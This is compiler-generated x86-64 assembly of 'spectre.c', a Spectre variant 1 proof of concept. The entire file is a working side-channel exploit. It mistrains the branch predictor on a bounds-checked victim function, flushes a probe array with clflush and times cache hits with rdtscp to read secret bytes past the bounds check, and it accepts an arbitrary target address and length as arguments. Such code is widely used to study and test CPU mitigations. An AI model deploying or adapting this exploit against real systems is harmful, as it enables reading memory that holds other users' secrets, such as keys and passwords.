	.file	"spectre.c"
	.intel_syntax noprefix
	.text
	.p2align 4
	.globl	check
	.type	check, @function
check:
.LFB5689:
	.cfi_startproc
	endbr64
	movsx	rax, DWORD PTR array1_size[rip]
	cmp	rax, rdi
	seta	al
	movzx	eax, al
	ret
	.cfi_endproc
.LFE5689:
	.size	check, .-check
	.p2align 4
	.globl	test
	.type	test, @function
test:
.LFB5690:
	.cfi_startproc
	endbr64
	movsx	rax, DWORD PTR array1_size[rip]
	cmp	rax, rdi
	jbe	.L3
	lea	rax, array1[rip]
	cmp	BYTE PTR [rax+rdi], sil
	je	.L5
.L3:
	ret
	.p2align 4,,10
	.p2align 3
.L5:
	movzx	esi, sil
	lea	rax, array2[rip]
	movzx	eax, BYTE PTR [rax+rsi]
	and	BYTE PTR temp[rip], al
	ret
	.cfi_endproc
.LFE5690:
	.size	test, .-test
	.p2align 4
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5691:
	.cfi_startproc
	endbr64
	movzx	esi, BYTE PTR check_value[rip]
	jmp	test
	.cfi_endproc
.LFE5691:
	.size	victim_function, .-victim_function
	.p2align 4
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5692:
	.cfi_startproc
	endbr64
	push	r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	mov	ecx, 128
	mov	r10d, 2863311531
	push	r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	lea	r14, array2[rip]
	push	r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	lea	r13, 131072[r14]
	push	r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	push	rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	lea	rbp, results.0[rip]
	push	rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	sub	rsp, 56
	.cfi_def_cfa_offset 112
	mov	QWORD PTR 8[rsp], rdi
	mov	rdi, rbp
	lea	r12, 32[rsp]
	mov	QWORD PTR 16[rsp], rsi
	mov	QWORD PTR 24[rsp], rdx
	mov	rax, QWORD PTR fs:40
	mov	QWORD PTR 40[rsp], rax
	xor	eax, eax
	mov	DWORD PTR 32[rsp], 0
	mov	DWORD PTR 4[rsp], 999
	rep stosq
.L8:
	lea	rax, array2[rip]
.L9:
	clflush	[rax]
	add	rax, 512
	cmp	rax, r13
	jne	.L9
	mov	eax, DWORD PTR 4[rsp]
	mov	ecx, DWORD PTR array1_size[rip]
	xor	ebx, ebx
	mov	r11, QWORD PTR 8[rsp]
	cdq
	idiv	ecx
	movsx	r9, edx
	xor	r11, r9
.L15:
	mov	BYTE PTR check_value[rip], bl
	movsx	r15, ebx
	mov	r8d, 29
	.p2align 4,,10
	.p2align 3
.L11:
	clflush	array1_size[rip]
	mov	DWORD PTR 36[rsp], 0
	mov	eax, DWORD PTR 36[rsp]
	cmp	eax, 99
	jg	.L13
	.p2align 4,,10
	.p2align 3
.L10:
	mov	eax, DWORD PTR 36[rsp]
	add	eax, 1
	mov	DWORD PTR 36[rsp], eax
	mov	eax, DWORD PTR 36[rsp]
	cmp	eax, 99
	jle	.L10
.L13:
	mov	eax, r8d
	movzx	esi, BYTE PTR check_value[rip]
	imul	rax, r10
	shr	rax, 34
	lea	edx, [rax+rax*2]
	mov	eax, r8d
	add	edx, edx
	sub	eax, edx
	sub	eax, 1
	xor	ax, ax
	cdqe
	mov	rdi, rax
	shr	rdi, 16
	or	rdi, rax
	and	rdi, r11
	xor	rdi, r9
	call	test
	sub	r8d, 1
	jnb	.L11
	rdtscp
	mov	rsi, rax
	sal	rdx, 32
	mov	DWORD PTR [r12], ecx
	movzx	eax, BYTE PTR [r14+r15]
	or	rsi, rdx
	rdtscp
	sal	rdx, 32
	mov	DWORD PTR [r12], ecx
	or	rax, rdx
	sub	rax, rsi
	cmp	rax, 50
	ja	.L14
	add	DWORD PTR 0[rbp+rbx*4], 1
.L14:
	add	rbx, 1
	cmp	rbx, 256
	jne	.L15
	mov	esi, DWORD PTR 0[rbp]
	mov	eax, 1
	xor	ecx, ecx
	mov	r9d, esi
	jmp	.L17
.L41:
	cmp	r8d, -1
	je	.L22
	movsx	rdi, r8d
	cmp	edx, DWORD PTR 0[rbp+rdi*4]
	cmovge	r8d, eax
.L16:
	movsx	rdx, ecx
	add	rax, 1
	mov	r9d, DWORD PTR 0[rbp+rdx*4]
	cmp	rax, 256
	je	.L40
.L17:
	mov	edx, DWORD PTR 0[rbp+rax*4]
	cmp	r9d, edx
	jg	.L41
	mov	r8d, ecx
	mov	ecx, eax
	jmp	.L16
.L22:
	mov	r8d, eax
	jmp	.L16
.L40:
	movsx	rdi, r8d
	mov	eax, DWORD PTR 0[rbp+rdi*4]
	lea	r11d, 4[rax+rax]
	cmp	r11d, r9d
	jl	.L18
	cmp	r9d, 2
	jne	.L24
	test	eax, eax
	je	.L18
.L24:
	sub	DWORD PTR 4[rsp], 1
	jne	.L8
.L18:
	xor	esi, DWORD PTR 32[rsp]
	mov	DWORD PTR results.0[rip], esi
	mov	rsi, QWORD PTR 16[rsp]
	mov	BYTE PTR [rsi], cl
	mov	rcx, QWORD PTR 24[rsp]
	mov	eax, DWORD PTR 0[rbp+rdx*4]
	mov	DWORD PTR [rcx], eax
	mov	BYTE PTR 1[rsi], r8b
	mov	eax, DWORD PTR 0[rbp+rdi*4]
	mov	DWORD PTR 4[rcx], eax
	mov	rax, QWORD PTR 40[rsp]
	sub	rax, QWORD PTR fs:40
	jne	.L42
	add	rsp, 56
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	rbp
	.cfi_def_cfa_offset 40
	pop	r12
	.cfi_def_cfa_offset 32
	pop	r13
	.cfi_def_cfa_offset 24
	pop	r14
	.cfi_def_cfa_offset 16
	pop	r15
	.cfi_def_cfa_offset 8
	ret
.L42:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5692:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.8
	.align 8
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.8
	.align 8
.LC7:
	.string	"Reading at malicious_x = %p secc= %c ..."
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.8
	.align 8
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.section	.text.startup,"ax",@progbits
	.p2align 4
	.globl	main
	.type	main, @function
main:
.LFB5693:
	.cfi_startproc
	endbr64
	push	r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	push	r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	push	r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	push	r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	push	rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	push	rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	sub	rsp, 72
	.cfi_def_cfa_offset 128
	mov	DWORD PTR 4[rsp], edi
	mov	QWORD PTR 8[rsp], rsi
	mov	rax, QWORD PTR fs:40
	mov	QWORD PTR 56[rsp], rax
	xor	eax, eax
.L44:
	mov	rdi, QWORD PTR stdin[rip]
	call	getc@PLT
	cmp	al, 114
	je	.L62
.L45:
	cmp	al, 10
	je	.L44
	cmp	al, 105
	jne	.L54
	xor	eax, eax
	call	getpid@PLT
	mov	edi, 1
	lea	rdx, check[rip+33]
	lea	rsi, .LC12[rip]
	mov	ecx, eax
	xor	eax, eax
	call	__printf_chk@PLT
	mov	rdi, QWORD PTR stdin[rip]
	call	getc@PLT
	cmp	al, 114
	jne	.L45
.L62:
	mov	rdx, QWORD PTR secret[rip]
	lea	rsi, .LC2[rip]
	mov	edi, 1
	xor	eax, eax
	lea	rbx, array1[rip]
	mov	rcx, rdx
	call	__printf_chk@PLT
	mov	rdi, QWORD PTR secret[rip]
	mov	rax, rdi
	sub	rax, rbx
	mov	QWORD PTR 32[rsp], rax
	call	strlen@PLT
	mov	edx, 131072
	mov	esi, 1
	lea	rdi, array2[rip]
	mov	DWORD PTR 28[rsp], eax
	mov	r12d, eax
	mov	BYTE PTR check_value[rip], 1
	call	memset@PLT
	cmp	DWORD PTR 4[rsp], 3
	je	.L63
.L46:
	xor	eax, eax
	mov	edx, r12d
	mov	edi, 1
	lea	rsi, .LC6[rip]
	call	__printf_chk@PLT
	sub	DWORD PTR 28[rsp], 1
	js	.L44
	xor	ebx, ebx
	lea	r14, 44[rsp]
	lea	r15, .LC7[rip]
	lea	r13, 54[rsp]
	lea	r12, .LC8[rip]
	.p2align 4,,10
	.p2align 3
.L47:
	mov	rax, QWORD PTR secret[rip]
	mov	rdx, QWORD PTR 32[rsp]
	mov	rsi, r15
	mov	edi, 1
	movsx	ecx, BYTE PTR [rax+rbx]
	xor	eax, eax
	call	__printf_chk@PLT
	mov	rdi, QWORD PTR 32[rsp]
	mov	rdx, r14
	mov	rsi, r13
	lea	rax, 1[rdi]
	mov	QWORD PTR 32[rsp], rax
	call	readMemoryByte
	mov	ebp, DWORD PTR 48[rsp]
	mov	r8d, DWORD PTR 44[rsp]
	mov	rsi, r12
	lea	rdx, .LC1[rip]
	mov	edi, 1
	lea	eax, [rbp+rbp]
	mov	DWORD PTR [rsp], r8d
	cmp	r8d, eax
	lea	rax, .LC0[rip]
	cmovge	rdx, rax
	xor	eax, eax
	call	__printf_chk@PLT
	movzx	edx, BYTE PTR 54[rsp]
	mov	r8d, DWORD PTR [rsp]
	mov	ecx, 63
	lea	rsi, .LC9[rip]
	mov	edi, 1
	mov	eax, edx
	sub	eax, 32
	cmp	al, 95
	cmovb	ecx, edx
	xor	eax, eax
	call	__printf_chk@PLT
	test	ebp, ebp
	jle	.L51
	movzx	edx, BYTE PTR 55[rsp]
	mov	ecx, 63
	mov	r8d, ebp
	lea	rsi, .LC10[rip]
	mov	edi, 1
	mov	eax, edx
	sub	eax, 32
	cmp	al, 95
	cmovb	ecx, edx
	xor	eax, eax
	call	__printf_chk@PLT
.L51:
	lea	rsi, .LC11[rip]
	mov	edi, 1
	xor	eax, eax
	add	rbx, 1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR 28[rsp]
	sub	eax, 1
	mov	DWORD PTR 28[rsp], eax
	test	eax, eax
	jns	.L47
	jmp	.L44
.L54:
	mov	rax, QWORD PTR 56[rsp]
	sub	rax, QWORD PTR fs:40
	jne	.L64
	add	rsp, 72
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	xor	eax, eax
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	rbp
	.cfi_def_cfa_offset 40
	pop	r12
	.cfi_def_cfa_offset 32
	pop	r13
	.cfi_def_cfa_offset 24
	pop	r14
	.cfi_def_cfa_offset 16
	pop	r15
	.cfi_def_cfa_offset 8
	ret
.L63:
	.cfi_restore_state
	mov	r15, QWORD PTR 8[rsp]
	lea	rdx, 32[rsp]
	lea	rsi, .LC3[rip]
	xor	eax, eax
	mov	rdi, QWORD PTR 8[r15]
	call	__isoc99_sscanf@PLT
	mov	rdi, QWORD PTR 16[r15]
	lea	rdx, 28[rsp]
	xor	eax, eax
	lea	rsi, .LC4[rip]
	sub	QWORD PTR 32[rsp], rbx
	call	__isoc99_sscanf@PLT
	mov	ecx, DWORD PTR 28[rsp]
	mov	rdx, QWORD PTR 32[rsp]
	xor	eax, eax
	lea	rsi, .LC5[rip]
	mov	edi, 1
	call	__printf_chk@PLT
	mov	r12d, DWORD PTR 28[rsp]
	jmp	.L46
.L64:
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5693:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.globl	check_value
	.data
	.type	check_value, @object
	.size	check_value, 1
check_value:
	.byte	1
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.8
	.align 8
.LC13:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC13
	.globl	array2
	.bss
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	unused2
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
